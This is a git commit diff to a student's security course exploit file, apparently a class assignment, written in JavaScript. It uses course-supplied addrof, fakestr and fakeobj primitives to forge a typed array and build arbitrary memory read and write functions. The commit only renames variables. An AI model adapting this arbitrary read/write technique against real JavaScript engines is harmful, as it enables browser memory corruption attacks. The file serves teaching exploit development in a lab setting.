416067d8bbaadb28ed7b8565916e401d4492c13a
Denis Ivanov <denis.ivanov26@gmail.com>
2022-04-09 21:31:21 -0500

    Update partb.js

--- proj5/partb.js
+++ proj5/partb.js
@@ -2,24 +2,24 @@
  * TODO: Part B solution goes here!
  */
 let dataPlane = new Uint32Array(1);
-let fakedStr = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00") + 16);
+let fakestring = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00") + 16);
 
 let heapArray = new Uint32Array(72);
-while (cs361s.addrof(heapArray) < cs361s.addrof(fakedStr) || cs361s.addrof(heapArray) > cs361s.addrof(fakedStr) - 72 + 16 + 10000000) {
+while (cs361s.addrof(heapArray) < cs361s.addrof(fakestring) || cs361s.addrof(heapArray) > cs361s.addrof(fakestring) - 72 + 16 + 10000000) {
     array = new Uint32Array(72);
 }
 let testing = function(){
     print('Test');
-    print(cs361s.addrof(fakedStr));
-    print(cs361s.addrof(fakedStr) - 56);
-    print(cs361s.addrof(fakedStr) - 56 + (2 ** 28));
+    print(cs361s.addrof(fakestring));
+    print(cs361s.addrof(fakestring) - 56);
+    print(cs361s.addrof(fakestring) - 56 + (2 ** 28));
 };
-let offset = cs361s.addrof(heapArray) - (cs361s.addrof(fakedStr) + 16);
-let bytes = new Uint8Array(72);
-//move chars rom fake string to bytes array
+let offset = cs361s.addrof(heapArray) - (cs361s.addrof(fakestring) + 16);
+let codes = new Uint8Array(72);
+
 var index = 0;
-while(index < bytes.length){
-    bytes[index] = fakedStr.charCodeAt(offset + index);
+while(index < codes.length){
+    codes[index] = fakestring.charCodeAt(offset + index);
     index++;
 }
 
@@ -29,10 +29,10 @@ while(fb < 8) {
     var bit = 0;
     let temp = cs361s.addrof(dataPlane);
     while(bit < fb) {
-        temp = (temp - bytes[72 - 16 + bit])/256;
+        temp = (temp - codes[72 - 16 + bit])/256;
         bit++;
     }   
-    bytes[72 - 16 + fb] = temp % 256;
+    codes[72 - 16 + fb] = temp % 256;
     fb++;
 }
 
@@ -49,20 +49,20 @@ for (var i = 0; i < 8; i++) {
 */
 
 // create the control plane
-bytes[0] = bytes[0] + 1;
-let cBuf = String.fromCharCode(...bytes);
+codes[0] = codes[0] + 1;
+let cBuf = String.fromCharCode(...codes);
 let controlPlane = cs361s.fakeobj(cs361s.addrof(cBuf) + 16);
 
-let fourWordBytes = 2 ** 32;
+let words = 2 ** 32;
 
 let readmem = function(addr) {
-    controlPlane[14] = addr % fourWordBytes;
-    controlPlane[15] = (addr - controlPlane[0]) / fourWordBytes;
+    controlPlane[14] = addr % words;
+    controlPlane[15] = (addr - controlPlane[0]) / words;
     return dataPlane[0];
 };
 
 let writemem = function(addr, val) {
-    controlPlane[14] = addr % fourWordBytes;
-    controlPlane[15] = (addr - controlPlane[0]) / fourWordBytes;
+    controlPlane[14] = addr % words;
+    controlPlane[15] = (addr - controlPlane[0]) / words;
     dataPlane[0] = val;
 };
